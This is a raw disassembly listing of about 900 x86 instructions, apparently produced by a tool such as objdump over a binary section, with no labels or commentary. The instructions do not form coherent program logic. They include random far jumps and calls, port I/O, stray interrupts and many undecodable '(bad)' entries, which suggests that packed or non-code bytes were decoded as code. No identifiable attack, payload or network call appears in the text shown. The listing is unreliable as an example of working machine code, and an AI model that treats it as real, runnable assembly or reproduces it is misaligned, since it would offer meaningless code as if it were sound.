  414a53:	mov    DWORD PTR [edx-0x4e],edx
  414a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a57:	lods   al,BYTE PTR ds:[esi]
  414a58:	mov    bh,cl
  414a5a:	test   al,0x8b
  414a5c:	or     al,0xce
  414a5e:	ins    DWORD PTR es:[edi],dx
  414a5f:	add    al,0x90
  414a61:	mov    dl,0x6c
  414a63:	mov    BYTE PTR [edi],0x1a
  414a66:	sti    
  414a67:	in     al,0x54
  414a69:	cmp    DWORD PTR [ecx-0x20],ebp
  414a6c:	sbb    esi,DWORD PTR [edx-0xfe6fc1b]
  414a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a73:	lods   al,BYTE PTR ds:[esi]
  414a74:	test   bh,cl
  414a76:	and    BYTE PTR [ebx+0x485ce14],cl
  414a7c:	nop
  414a7d:	mov    dl,0x6c
  414a7f:	into   
  414a80:	dec    edi
  414a81:	sbb    eax,edx
  414a83:	in     al,0xd4
  414a85:	ss and ebx,edi
  414a88:	inc    DWORD PTR [edx]
  414a8a:	in     eax,0xb
  414a8c:	push   0xffffffb0
  414a8e:	cwde   
  414a8f:	or     BYTE PTR [ebx-0xd],dl
  414a92:	repz mov eax,0x4a52f1b
  414a98:	nop
  414a99:	mov    dl,0x7e
  414a9b:	mov    BYTE PTR [esi+ebp*8+0x399003e4],ch
  414aa2:	test   eax,0x49394bdf
  414aa7:	loopne 0x414a9c
  414aa9:	mov    cl,0xe5
  414aab:	add    eax,DWORD PTR [eax]
  414aad:	add    BYTE PTR [eax],al
  414aaf:	add    BYTE PTR [eax],al
  414ab1:	cmovbe eax,ecx
  414ab4:	lahf   
  414ab5:	nop
  414ab6:	mov    dl,0xe5
  414ab8:	mov    ah,ah
  414aba:	int    0xc9
  414abc:	add    edx,DWORD PTR [eax+0x6c577eb2]
  414ac2:	mov    ch,BYTE PTR [ebp+eax*8+0x47]
  414ac6:	mov    bl,0xe5
  414ac8:	add    DWORD PTR [edi-0x60d0592b],0xffffffbf
  414acf:	in     eax,0x3
  414ad1:	adc    BYTE PTR [ebx-0x4265c2f2],dh
  414ad7:	push   cs
  414ad8:	jmp    0xd2bc4c70
  414add:	lods   eax,DWORD PTR ds:[esi]
  414ade:	sbb    ebp,esp
  414ae0:	pop    eax
  414ae1:	xchg   ecx,eax
  414ae2:	mov    dl,0xe
  414ae4:	fisubr DWORD PTR [esp+esi*2-0x7b]
  414ae8:	ins    DWORD PTR es:[edi],dx
  414ae9:	addr16 pop edx
  414aeb:	push   cs
  414aec:	jmp    0x726d5684
  414af1:	jbe    0x414a9d
  414af3:	mov    DWORD PTR [eax-0x6dc44e81],ebp
  414af9:	push   edx
  414afa:	or     edx,DWORD PTR [edi]
  414afc:	stos   BYTE PTR es:[edi],al
  414afd:	xor    al,0xf3
  414aff:	test   BYTE PTR [ebp+0x37],ah
  414b02:	pop    edx
  414b03:	push   cs
  414b04:	jmp    0x1a45569c
  414b09:	in     eax,0x73
  414b0b:	test   DWORD PTR [ebp-0x16f1a621],eax
  414b11:	xchg   ebx,eax
  414b12:	dec    ecx
  414b13:	push   cs
  414b14:	jmp    0x414b19
  414b19:	add    BYTE PTR [ebx-0x49e7764e],ah
  414b1f:	mov    ch,0x83
  414b21:	lods   al,BYTE PTR ds:[esi]
  414b22:	mov    ecx,DWORD PTR [ebx]
  414b24:	or     al,0x72
  414b26:	int    0xd3
  414b28:	int    0x9d
  414b2a:	mov    cl,0xbc
  414b2c:	push   cs
  414b2d:	jmp    0xadbbfdd5
  414b32:	mov    BYTE PTR [ecx],0xef
  414b35:	leave  
  414b36:	xchg   ebx,eax
  414b37:	xchg   BYTE PTR ds:0x3eb293b4,dh
  414b3d:	jmp    0xe97316b9
  414b42:	xchg   ebx,eax
  414b43:	jb     0x414b53
  414b45:	push   ebp
  414b46:	mov    bh,BYTE PTR [ebp-0x4d1c16f2]
  414b4c:	jns    0x414bc3
  414b4e:	mov    edx,0x53b4
  414b53:	pop    ebx
  414b54:	sub    ah,BYTE PTR [eax-0x70]
  414b57:	jp     0x414b83
  414b59:	les    edi,FWORD PTR [ecx-0x4b]
  414b5c:	push   cs
  414b5d:	je     0x414ae6
  414b5f:	push   eax
  414b60:	dec    ebx
  414b61:	or     al,0x68
  414b63:	rol    DWORD PTR [esi+0x6a],1
  414b66:	cli    
  414b67:	dec    esi
  414b68:	and    DWORD PTR [esi],eax
  414b6a:	cmp    DWORD PTR [ebp-0x4a9bf549],esi
  414b70:	push   cs
  414b71:	jmp    0x414ba1
  414b73:	retf   
  414b74:	add    al,0xeb
  414b76:	sub    ecx,ebx
  414b78:	add    ebx,DWORD PTR [ecx-0x4e]
  414b7b:	jmp    0x41a806
  414b80:	add    BYTE PTR [eax],al
  414b82:	add    BYTE PTR [ebp-0x2b],cl
  414b85:	outs   dx,DWORD PTR ds:[esi]
  414b86:	stc    
  414b87:	mov    dh,0xb6
  414b89:	push   cs
  414b8a:	add    BYTE PTR [edi],dh
  414b8c:	mov    al,0x85
  414b8e:	sar    DWORD PTR [eax+0x2dc7063e],0xe1
  414b95:	push   0x2
  414b97:	jmp    0x2dc95a50
  414b9c:	loope  0x414c18
  414b9e:	mov    BYTE PTR ds:0x5eeb7be1,dh
  414ba4:	inc    ecx
  414ba5:	dec    edx
  414ba6:	and    al,0xd
  414ba8:	mov    dh,0xe
  414baa:	add    cl,ch
  414bac:	sub    al,0x42
  414bae:	and    al,0x2d
  414bb0:	dec    esp
  414bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb2:	mov    ebp,esp
  414bb4:	lods   al,BYTE PTR ds:[esi]
  414bb5:	(bad)  
  414bb6:	loopne 0x414b66
  414bb8:	sub    eax,0xb4b9248a
  414bbd:	push   cs
  414bbe:	add    BYTE PTR [edx],dh
  414bc0:	xor    ch,BYTE PTR [edx]
  414bc2:	fs mov eax,0x43990eb4
  414bc8:	mov    ch,0x51
  414bca:	div    DWORD PTR [esi-0x6fba4649]
  414bd0:	sti    
  414bd1:	cmp    DWORD PTR [esp+ebp*4-0x6ffff68b],0xffffffa4
  414bd9:	mov    ah,0x66
  414bdb:	or     eax,0x1b3e1f4a
  414be0:	push   edx
  414be1:	test   ch,al
  414be3:	cli    
  414be4:	or     al,0x92
  414be6:	pop    ebx
  414be7:	add    BYTE PTR [eax],al
  414be9:	add    BYTE PTR [eax],al
  414beb:	add    BYTE PTR [edi+0x57],ah
  414bee:	hlt    
  414bef:	(bad)  
  414bf0:	aam    0xd9
  414bf2:	test   DWORD PTR [edi-0x6f],esi
  414bf5:	mov    ah,0xb7
  414bf7:	add    DWORD PTR [ebx],ebx
  414bf9:	and    edx,ecx
  414bfb:	fist   WORD PTR [edx-0x4cabe1c8]
  414c01:	aad    0xa
  414c03:	mov    DWORD PTR [eax],edi
  414c05:	xchg   ebx,eax
  414c06:	daa    
  414c07:	and    al,0xbc
  414c09:	xchg   esi,eax
  414c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c0b:	jae    0x414ba4
  414c0d:	jecxz  0x414bc3
  414c0f:	out    0x2,eax
  414c11:	pop    ss
  414c12:	or     eax,DWORD PTR [eax]
  414c14:	sbb    eax,DWORD PTR [esi-0x31]
  414c17:	pop    edi
  414c18:	iret   
  414c19:	push   ebp
  414c1a:	iret   
  414c1b:	daa    
  414c1c:	xchg   ecx,eax
  414c1d:	or     DWORD PTR [ebx],ecx
  414c1f:	add    bl,ch
  414c21:	add    al,0x84
  414c23:	lods   al,BYTE PTR ds:[esi]
  414c24:	mov    ah,0xe9
  414c26:	or     DWORD PTR [eax],eax
  414c28:	nop
  414c29:	xchg   edx,eax
  414c2a:	daa    
  414c2b:	and    al,0x44
  414c2d:	xchg   bh,ch
  414c2f:	cmp    al,0xf9
  414c31:	and    ecx,DWORD PTR [edi+edx*2]
  414c34:	(bad)  
  414c35:	mov    ds:0x896ca48c,al
  414c3a:	or     eax,DWORD PTR [eax]
  414c3c:	nop
  414c3d:	or     DWORD PTR [esp+ecx*4+0xbcd6c],ecx
  414c44:	nop
  414c45:	or     BYTE PTR [ebp-0x7e1e93b4],al
  414c4b:	jl     0x414cc1
  414c4d:	mov    dl,0x4d
  414c4f:	mov    eax,DWORD PTR [eax]
  414c51:	add    BYTE PTR [eax],al
  414c53:	add    BYTE PTR [eax],al
  414c55:	dec    esp
  414c56:	(bad)  
  414c57:	xor    DWORD PTR ds:0x86f57145,eax
  414c5d:	mov    WORD PTR [ebp-0x1d],?
  414c60:	add    edx,DWORD PTR [eax-0x537ff34e]
  414c66:	xchg   esi,eax
  414c67:	out    0x3,al
  414c69:	nop
  414c6a:	scas   eax,DWORD PTR es:[edi]
  414c6b:	sub    BYTE PTR [ebp-0x53f6c9f1],bh
  414c71:	nop
  414c72:	mov    dl,0xe5
  414c74:	jle    0x414ce1
  414c76:	xchg   ah,dl
  414c78:	call   0xfa57:0xcad3f479
  414c7f:	push   ecx
  414c80:	clc    
  414c81:	cli    
  414c82:	mov    cl,0xe5
  414c84:	add    edx,DWORD PTR [eax+0x79b6e471]
  414c8a:	jmp    0x70:0x33150069
  414c91:	pop    ecx
  414c92:	cli    
  414c93:	rcl    BYTE PTR [ecx],cl
  414c95:	adc    DWORD PTR [edi-0x4a027eb0],ebp
  414c9b:	sbb    al,0xbc
  414c9d:	or     DWORD PTR [eax],0x92b4586c
  414ca3:	jl     0x414ccd
  414ca5:	lods   al,BYTE PTR ds:[esi]
  414ca6:	data16 jl 0x414cf1
  414ca9:	mov    ah,0x9a
  414cab:	cmp    BYTE PTR fs:[edx+eax*8+0x8b72ee5],ch
  414cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb4:	pop    es
  414cb5:	xchg   edx,eax
  414cb6:	xchg   ah,al
  414cb8:	add    al,0x0
  414cba:	add    BYTE PTR [eax],al
  414cbc:	add    BYTE PTR [eax],al
  414cbe:	add    eax,0xfe04f171
  414cc3:	loope  0x414cea
  414cc5:	lods   al,BYTE PTR ds:[esi]
  414cc6:	mov    BYTE PTR [ebx],dh
  414cc8:	add    eax,0xc9660f03
  414ccd:	movhps QWORD PTR [esi+0xe],xmm6
  414cd1:	int    0x67
  414cd3:	xchg   BYTE PTR [edx],al
  414cd5:	bound  edx,QWORD PTR [eax-0x2a]
  414cd8:	jbe    0x414cd0
  414cda:	and    eax,0xdf701ea6
  414cdf:	(bad)  
  414ce0:	sbb    bl,bh
  414ce2:	shr    BYTE PTR [esi-0x50a0aaf6],cl
  414ce8:	mov    bh,0x28
  414cea:	xchg   BYTE PTR [edi+0xb52b1b8],ch
  414cf0:	push   es
  414cf1:	push   0x33
  414cf3:	inc    BYTE PTR [ebp-0x7c358fdb]
  414cf9:	sub    eax,0x2d85ae70
  414cfe:	xor    BYTE PTR [esi-0x5538a101],bh
  414d04:	push   cs
  414d05:	call   0x2dc6ff9d
  414d0a:	xor    BYTE PTR [edx+0x5a4f458d],bh
  414d10:	or     eax,0xeb293e9
  414d15:	jmp    0xddb7839
  414d1a:	mov    al,ds:0x18e90eb2
  414d1f:	jg     0x414d4b
  414d21:	cmc    
  414d22:	add    BYTE PTR [eax],al
  414d24:	add    BYTE PTR [eax],al
  414d26:	add    BYTE PTR [edx],bl
  414d28:	jg     0x414d54
  414d2a:	stc    
  414d2b:	jle    0x414d36
  414d2d:	jp     0x414d2b
  414d2f:	or     BYTE PTR [edi],dh
  414d31:	sub    dl,BYTE PTR [ecx-0x6d]
  414d34:	mov    dl,0xe
  414d36:	fs (bad) 
  414d38:	xor    DWORD PTR [esi],ecx
  414d3a:	jmp    0x344cffd2
  414d3f:	fcom   DWORD PTR [ebx+edi*2]
  414d42:	enter  0xe8b8,0x44
  414d46:	sub    dl,bh
  414d48:	mov    al,0x4d
  414d4a:	bound  eax,QWORD PTR [esi]
  414d4c:	xor    al,0xc6
  414d4e:	add    BYTE PTR [esi+0xd8ba542],cl
  414d54:	fimul  WORD PTR [esi-0x75]
  414d57:	or     eax,0x458b5ade
  414d5c:	fnstsw WORD PTR [edx-0x7a4e5700]
  414d62:	jl     0x414cf9
  414d64:	mov    ds:0xe957c8d,al
  414d69:	out    dx,eax
  414d6a:	jae    0x414d2c
  414d6c:	jge    0x414d5e
  414d6e:	cmp    edi,DWORD PTR [ebx]
  414d70:	lds    ebx,FWORD PTR [ebp-0x7b]
  414d73:	xor    bh,BYTE PTR [edx+0xaa5ff2a]
  414d79:	sub    ecx,DWORD PTR [ebp+0x50670ab5]
  414d7f:	fwait
  414d80:	jge    0x414d5f
  414d82:	mov    edi,esi
  414d84:	sbb    eax,0xb13b24fc
  414d89:	test   DWORD PTR [eax+eax*1+0x0],ebx
  414d8d:	add    BYTE PTR [eax],al
  414d8f:	add    BYTE PTR [ebp-0x2f],dl
  414d92:	mov    eax,eax
  414d94:	xor    al,0x1
  414d96:	xchg   BYTE PTR [ebp+edx*2+0x39000e85],dl
  414d9d:	sbb    al,0x2c
  414d9f:	mov    edi,DWORD PTR [ebp+0xa]
  414da2:	imul   ecx,DWORD PTR [ebx+0x3bafdd6b],0x71
  414da9:	mov    ecx,0xef68a18
  414dae:	dec    ebx
  414daf:	and    al,0xe5
  414db1:	mov    ecx,0xb7508300
  414db6:	jp     0x414dc6
  414db8:	arpl   WORD PTR [ecx-0x11],bp
  414dbb:	cmp    DWORD PTR ds:0xf4747c15,esi
  414dc1:	addr16 xor eax,0x8585fbfa
  414dc7:	ins    BYTE PTR es:[edi],dx
  414dc8:	aad    0x64
  414dca:	test   DWORD PTR [eax+edx*4-0x4000c111],edx
  414dd1:	or     al,BYTE PTR [esi-0x4c71782e]
  414dd7:	add    BYTE PTR [eax+0x6c4c700b],dl
  414ddd:	fild   WORD PTR [ebp-0x1db6e739]
  414de3:	push   ebx
  414de4:	ins    BYTE PTR es:[edi],dx
  414de5:	iret   
  414de6:	ss xor ebx,ecx
  414de9:	in     al,0xb
  414deb:	xor    DWORD PTR [ecx+0xa],0x430b000b
  414df2:	or     al,0xb6
  414df4:	add    BYTE PTR [eax],al
  414df6:	add    BYTE PTR [eax],al
  414df8:	add    BYTE PTR [esi-0x17dbb880],al
  414dfe:	or     al,0x75
  414e00:	add    al,0x91
  414e02:	add    al,cl
  414e04:	or     eax,0xb1e14
  414e09:	nop
  414e0a:	retf   
  414e0b:	fcomip st,st(4)
  414e0d:	ret    0x9221
  414e10:	ret    0x990
  414e13:	or     ecx,DWORD PTR ds:0xbee01406
  414e19:	xchg   DWORD PTR [ebp+0x9900074],ecx
  414e1f:	inc    ebp
  414e20:	cmp    DWORD PTR [edi],ebx
  414e22:	clc    
  414e23:	mov    edx,0xb09ede7
  414e28:	add    BYTE PTR [ebx],dl
  414e2a:	push   esi
  414e2b:	out    0xeb,eax
  414e2d:	nop
  414e2e:	or     DWORD PTR [ebx],ecx
  414e30:	add    BYTE PTR [edi-0x6fff6373],dl
  414e36:	or     DWORD PTR [eax-0x7c],esi
  414e39:	lods   al,BYTE PTR ds:[esi]
  414e3a:	jns    0x414e47
  414e3c:	add    BYTE PTR [eax+0x48248708],dl
  414e42:	or     cl,BYTE PTR [ebx]
  414e44:	add    BYTE PTR [ebx+0x9860cb9],bl
  414e4a:	mov    bl,0xe5
  414e4c:	add    edx,DWORD PTR [eax+0x393618b7]
  414e52:	xor    eax,0xb76c373c
  414e57:	pop    ecx
  414e58:	out    0xe7,eax
  414e5a:	mov    dl,0xe5
  414e5c:	add    eax,DWORD PTR [eax]
  414e5e:	add    BYTE PTR [eax],al
  414e60:	add    BYTE PTR [eax],al
  414e62:	es ins BYTE PTR es:[edi],dx
  414e64:	lock ss ins BYTE PTR es:[edi],dx
  414e67:	(bad)  
  414e68:	push   0x47
  414e6a:	je     0x414df6
  414e6c:	xchg   ebp,eax
  414e6d:	mov    dl,0xdc
  414e6f:	(bad)  
  414e70:	lods   eax,DWORD PTR ds:[esi]
  414e71:	add    al,0x90
  414e73:	mov    dl,0x7c
  414e75:	aad    0x19
  414e77:	in     al,dx
  414e78:	int3   
  414e79:	pop    ebx
  414e7a:	mov    ah,0xb0
  414e7c:	in     eax,0x7c
  414e7e:	aam    0xd6
  414e80:	inc    ebp
  414e81:	xchg   DWORD PTR [eax-0x7b],edx
  414e84:	repz pushf 
  414e86:	mov    ecx,0x2fe86127
  414e8b:	mov    dl,0xe5
  414e8d:	add    ecx,DWORD PTR [ecx]
  414e8f:	outs   dx,BYTE PTR ds:[esi]
  414e90:	shl    DWORD PTR [edi],0x91
  414e93:	icebp  
  414e94:	jmp    0x414e49
  414e96:	ret    0x6c98
  414e99:	fisubr DWORD PTR [ecx-0x1f]
  414e9c:	push   0x6
  414e9e:	jp     0x414f16
  414ea0:	shl    DWORD PTR [edi],0xa3
  414ea3:	lods   al,BYTE PTR ds:[esi]
  414ea4:	fs stos DWORD PTR es:[edi],eax
  414ea6:	daa    
  414ea7:	jg     0x414e90
  414ea9:	jge    0x414e7d
  414eab:	mov    cl,0xbb
  414ead:	inc    edi
  414eae:	ins    BYTE PTR es:[edi],dx
  414eaf:	test   ecx,edx
  414eb1:	push   es
  414eb2:	push   esi
  414eb3:	mov    bh,0x58
  414eb5:	xor    BYTE PTR ss:[edi],ah
  414eb8:	jno    0x414ea2
  414eba:	pop    ebx
  414ebb:	mov    cl,0xe5
  414ebd:	add    ecx,DWORD PTR [ecx]
  414ebf:	mov    es,WORD PTR [ecx]
  414ec1:	pop    eax
  414ec2:	adc    BYTE PTR [eax+esi*1-0x1],bh
  414ec6:	add    BYTE PTR [eax],al
  414ec8:	add    BYTE PTR [eax],al
  414eca:	add    BYTE PTR [edx-0x5a],ah
  414ecd:	push   cs
  414ece:	push   0x2d
  414ed0:	sti    
  414ed1:	jp     0x414eb7
  414ed3:	or     al,0xf9
  414ed5:	or     ebx,DWORD PTR [ebp+ecx*8-0x66650847]
  414edc:	xor    dh,BYTE PTR [eax]
  414ede:	jecxz  0x414e66
  414ee0:	sti    
  414ee1:	dec    eax
  414ee2:	bound  esp,QWORD PTR [eax-0x2a]
  414ee5:	push   ds
  414ee6:	jo     0x414f28
  414ee8:	(bad)  
  414ee9:	adc    ah,BYTE PTR [esi+edi*4+0x7e]
  414eed:	jns    0x414e9f
  414eef:	pop    es
  414ef0:	(bad)  
  414ef1:	retf   0x93e9
  414ef4:	mov    dl,0x79
  414ef6:	push   ebp
  414ef7:	or     eax,0xf292a5f
  414efc:	in     eax,0x75
  414efe:	dec    ebp
  414eff:	std    
  414f00:	repz and ah,BYTE PTR [edi-0x16f4ed9a]
  414f07:	xchg   ebx,eax
  414f08:	jge    0x414f5f
  414f0a:	cli    
  414f0b:	sub    al,dl
  414f0d:	inc    edx
  414f0e:	or     eax,0xa891a778
  414f13:	mov    eax,gs
  414f15:	xor    dh,BYTE PTR ds:0x3178c638
  414f1b:	or     eax,0x93c52a77
  414f20:	jle    0x414f32
  414f22:	shl    ah,cl
  414f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f25:	mov    ebx,DWORD PTR [eax-0x6e]
  414f28:	mov    dl,0xe
  414f2a:	jb     0x414fa3
  414f2c:	into   
  414f2d:	xor    ah,dh
  414f2f:	add    BYTE PTR [eax],al
  414f31:	add    BYTE PTR [eax],al
  414f33:	add    BYTE PTR [ecx+0x4db24df9],bl
  414f39:	jg     0x414f69
  414f3b:	and    bl,cl
  414f3d:	jle    0x414f51
  414f3f:	and    al,BYTE PTR [ebp-0x7b]
  414f42:	inc    BYTE PTR [edx-0x68]
  414f45:	mov    ebx,0x840cdec3
  414f4a:	or     eax,0x1b5f900
  414f4f:	mov    dh,0xf8
  414f51:	je     0x414f88
  414f53:	ret    0xac1d
  414f56:	xor    eax,0xe5421bcb
  414f5b:	add    DWORD PTR [eax],eax
  414f5d:	pop    es
  414f5e:	(bad)  
  414f5f:	(bad)  
  414f62:	out    dx,eax
  414f63:	jmp    FWORD PTR [ecx-0x22dbbd84]
  414f69:	jbe    0x414f05
  414f6b:	and    al,0x45
  414f6d:	mov    ch,0xe
  414f6f:	add    dl,ch
  414f71:	sbb    BYTE PTR [ebx+0x55],bl
  414f74:	cld    
  414f75:	inc    edx
  414f76:	mov    edx,0xeb4a524
  414f7b:	add    BYTE PTR [ebx+ebp*2],al
  414f7e:	sub    bl,BYTE PTR [eax-0x37]
  414f81:	pushf  
  414f82:	or     al,0x55
  414f84:	mov    edi,0x1d89c07d
  414f89:	or     dl,bh
  414f8b:	add    BYTE PTR [ecx-0x4b],bh
  414f8e:	xchg   DWORD PTR [ebp+ecx*4+0x69000e4e],esi
  414f95:	jbe    0x414ff9
  414f97:	and    al,0x0
  414f99:	add    BYTE PTR [eax],al
  414f9b:	add    BYTE PTR [eax],al
  414f9d:	rcl    DWORD PTR [esi],1
  414f9f:	and    ebp,eax
  414fa1:	test   BYTE PTR [eax-0x7b],0xf8
  414fa5:	xor    BYTE PTR [ecx+0x2a],bl
  414fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fa9:	sub    DWORD PTR [ebp+0x7c3b740e],esi
  414faf:	dec    edx
  414fb0:	and    al,0x59
  414fb2:	sub    cl,dh
  414fb4:	(bad)  
  414fb6:	sub    ch,BYTE PTR [edx]
  414fb8:	shr    BYTE PTR [ecx],0xb5
  414fbb:	push   cs
  414fbc:	mov    DWORD PTR [ebp+0xa],ebp
  414fbf:	jno    0x33fc3b
  414fc5:	data16 stc 
  414fc7:	mov    bh,dh
  414fc9:	nop
  414fca:	or     ecx,DWORD PTR [ebx]
  414fcc:	add    BYTE PTR [ecx],dl
  414fce:	push   0x6feffc03
  414fd3:	ss sub al,0x28
  414fd6:	xlat   BYTE PTR ds:[ebx]
  414fd7:	sahf   
  414fd8:	std    
  414fd9:	fild   WORD PTR [ebx]
  414fdb:	mov    ds:0x70d87874,eax
  414fe0:	out    0x90,eax
  414fe2:	or     ecx,DWORD PTR [ebx]
  414fe4:	jg     0x414fad
  414fe6:	clc    
  414fe7:	sahf   
  414fe8:	std    
  414fe9:	mov    edi,0xb7831620
  414fee:	xlat   BYTE PTR ds:[ebx]
  414fef:	test   edi,edx
  414ff1:	nop
  414ff2:	or     ecx,DWORD PTR [ebx]
  414ff4:	jmp    0x24afd494
  414ff9:	fmul   DWORD PTR [edx]
  414ffb:	or     eax,DWORD PTR [eax]
  414ffd:	pop    ebx
  414ffe:	stc    
  414fff:	xor    eax,0x1
  415004:	add    BYTE PTR [eax],al
  415006:	sbb    eax,0xe4890960
  41500b:	lods   eax,DWORD PTR ds:[esi]
  41500c:	sub    cl,BYTE PTR [ecx+0x76a624]
  415012:	nop
  415013:	or     esp,edi
  415015:	cld    
  415016:	test   eax,0xdc37e66d
  41501b:	rol    DWORD PTR [ebp-0x1c521b27],cl
  415021:	icebp  
  415022:	jecxz  0x414fbf
  415024:	lahf   
  415025:	je     0x41509b
  415027:	in     eax,0x8d
  415029:	inc    esp
  41502a:	ins    BYTE PTR es:[edi],dx
  41502b:	mov    eax,ds:0x3d0b525a
  415030:	je     0x415000
  415032:	sub    dh,dh
  415034:	in     al,dx
  415035:	add    DWORD PTR [eax+0xd0dcb86],edx
  41503b:	adc    DWORD PTR [edx],ecx
  41503d:	add    BYTE PTR [eax-0x4fdbc06c],dl
  415043:	xchg   esp,eax
  415044:	xchg   edi,eax
  415045:	and    al,0x44
  415047:	mov    bl,0xe5
  415049:	add    edx,DWORD PTR [eax+0x4c7b1b0b]
  41504f:	into   
  415050:	sar    DWORD PTR [edx-0x2e],0xcb
  415054:	es jmp 0xbc8e:0x79e77fff
  41505c:	test   eax,0xcf7d63e7
  415061:	sbb    bh,0xb1
  415064:	rol    BYTE PTR [edi+0x3e5b2eb],1
  41506a:	add    BYTE PTR [eax],al
  41506c:	add    BYTE PTR [eax],al
  41506e:	add    BYTE PTR [edx],bl
  415070:	jno    0x415058
  415072:	jmp    0xfed41eca
  415077:	adc    esp,ebx
  415079:	in     al,0x3
  41507b:	nop
  41507c:	sub    esi,edx
  41507e:	jmp    0x4150ab
  415080:	into   
  415081:	mov    ch,0xfe
  415083:	adc    ch,bh
  415085:	in     al,0x3
  415087:	nop
  415088:	sub    ebp,DWORD PTR [ecx-0x22446019]
  41508e:	std    
  41508f:	or     al,0x3a
  415091:	in     eax,0x3
  415093:	nop
  415094:	xor    bl,BYTE PTR [edx-0x53]
  415097:	mov    edi,DWORD PTR [ebp+0xd]
  41509a:	jmp    0x8442d416
  41509f:	jmp    0x415053
  4150a1:	sti    
  4150a2:	ss jle 0x4150d0
  4150a5:	and    eax,ebp
  4150a7:	jg     0x4150a9
  4150a9:	and    eax,0xf17d7000
  4150ae:	or     BYTE PTR [ecx-0x4f],0x19
  4150b2:	add    BYTE PTR [ecx],dl
  4150b4:	sti    
  4150b5:	loop   0x4150ee
  4150b7:	lea    esi,[ebx]
  4150b9:	add    eax,ebp
  4150bb:	mov    bl,0xb4
  4150bd:	repnz add BYTE PTR [ebx],bl
  4150c0:	jge    0x4150a8
  4150c2:	loop   0x41509f
  4150c4:	int    0xe
  4150c6:	lea    ecx,[edx+esi*4-0x314f9df2]
  4150cd:	pop    edx
  4150ce:	push   eax
  4150cf:	or     al,0xf6
  4150d1:	out    dx,al
  4150d2:	pop    esi
  4150d3:	add    BYTE PTR [eax],al
  4150d5:	add    BYTE PTR [eax],al
  4150d7:	add    BYTE PTR [ecx],al
  4150d9:	mul    dl
  4150db:	xlat   BYTE PTR ds:[ebx]
  4150dc:	js     0x4150d9
  4150de:	cmp    dl,BYTE PTR [edi+0x56]
  4150e1:	mov    ecx,0x77ebbdf0
  4150e6:	out    dx,eax
  4150e7:	loopne 0x415118
  4150e9:	cmc    
  4150ea:	out    dx,al
  4150eb:	mov    esp,0x592297a
  4150f0:	js     0x4150e9
  4150f2:	out    dx,al
  4150f3:	jmp    0xd16bdbb2
  4150f8:	xchg   DWORD PTR [ecx-0x75],ebp
  4150fb:	adc    cl,BYTE PTR [eax-0x67a3d58a]
  415101:	sbb    esi,esi
  415103:	push   es
  415104:	cmc    
  415105:	hlt    
  415106:	pop    ebp
  415107:	jb     0x415151
  415109:	into   
  41510a:	push   esi
  41510b:	push   0xffffffcc
  41510d:	test   eax,0xcf18625e
  415112:	callw  0x3a9
  415116:	mov    ebp,DWORD PTR [ecx-0x3109985]
  41511c:	(bad)  
  41511d:	pushf  
  41511e:	dec    esi
  41511f:	jmp    0x72434034
  415124:	bswap  edi
  415126:	mov    gs,ecx
  415128:	xchg   ebx,eax
  415129:	mov    dl,0x35
  41512b:	push   ebp
  41512c:	outs   dx,DWORD PTR ds:[esi]
  41512d:	out    dx,al
  41512e:	or     eax,0x422b93e9
  415133:	int    0xdf
  415135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415136:	aas    
  415137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415138:	mov    edx,0x692a2e
  41513d:	add    BYTE PTR [eax],al
  41513f:	add    BYTE PTR [eax],al
  415141:	xchg   ebx,eax
  415142:	mov    dl,0xe
  415144:	mov    es,WORD PTR [esi+0x75006b62]
  41514a:	scas   al,BYTE PTR es:[edi]
  41514b:	aaa    
  41514c:	lods   al,BYTE PTR ds:[esi]
  41514d:	push   ebp
  41514e:	xor    cl,BYTE PTR [esi]
  415150:	add    BYTE PTR [ecx],ch
  415152:	mov    esi,0x1b348b53
  415157:	imul   ecx,DWORD PTR [ebx-0x7500f233],0xffffffcd
  41515e:	or     eax,0xddd835b
  415163:	daa    
  415164:	add    ch,al
  415166:	stc    
  415167:	test   ebp,ecx
  415169:	dec    esi
  41516a:	pushf  
  41516b:	pop    esi
  41516c:	arpl   WORD PTR ds:0x1f464b2,si
  415172:	sub    eax,0xab174f1
  415177:	div    DWORD PTR [ebp+esi*4+0x7a]
  41517b:	leave  
  41517c:	jmp    0x4151a2
  41517e:	jnp    0x4151da
  415180:	and    al,0xc9
  415182:	sub    al,0xdc
  415184:	je     0x41515d
  415186:	xor    dh,BYTE PTR [edx+0xeb11524]
  41518c:	add    BYTE PTR [eax+0x352b6dc7],ch
  415192:	or     eax,0xb179013f
  415197:	test   DWORD PTR [ebp+edx*4+0x69ffefce],ecx
  41519e:	aam    0x92
  4151a0:	and    al,0xb9
  4151a2:	scas   eax,DWORD PTR es:[edi]
  4151a3:	push   cs
  4151a4:	add    BYTE PTR [eax],al
  4151a6:	add    BYTE PTR [eax],al
  4151a8:	add    BYTE PTR [eax],al
  4151aa:	lock lahf 
  4151ac:	xchg   DWORD PTR [ecx+0x75],ebx
  4151af:	adc    al,0x49
  4151b1:	and    DWORD PTR [ecx],0x49
  4151b4:	in     eax,0x42
  4151b6:	repnz xor ch,BYTE PTR [edx]
  4151b9:	enter  0xb139,0xe
  4151bd:	cdq    
  4151be:	(bad)  
  4151bf:	out    dx,eax
  4151c0:	mov    esi,0xc45aaf8
  4151c5:	jge    0x415157
  4151c7:	pop    es
  4151c8:	jo     0x41518d
  4151ca:	cmp    esi,DWORD PTR [esi]
  4151cc:	jo     0x41515a
  4151ce:	ins    BYTE PTR es:[edi],dx
  4151cf:	jae    0x4151db
  4151d1:	add    BYTE PTR [eax-0x1fdb8920],dl
  4151d7:	or     cl,BYTE PTR [ebx]
  4151d9:	add    BYTE PTR [ebx],bl
  4151db:	pop    edi
  4151dc:	out    dx,al
  4151dd:	pop    edi
  4151de:	xchg   ecx,eax
  4151df:	or     ecx,DWORD PTR [ebx]
  4151e1:	xchg   DWORD PTR [edx+0x34247680],ecx
  4151e7:	or     ecx,DWORD PTR [ebx]
  4151e9:	add    BYTE PTR [ebx-0x6f5011a9],bh
  4151ef:	or     ecx,DWORD PTR [ebx]
  4151f1:	xchg   DWORD PTR [edx+0xf],ecx
  4151f4:	nop
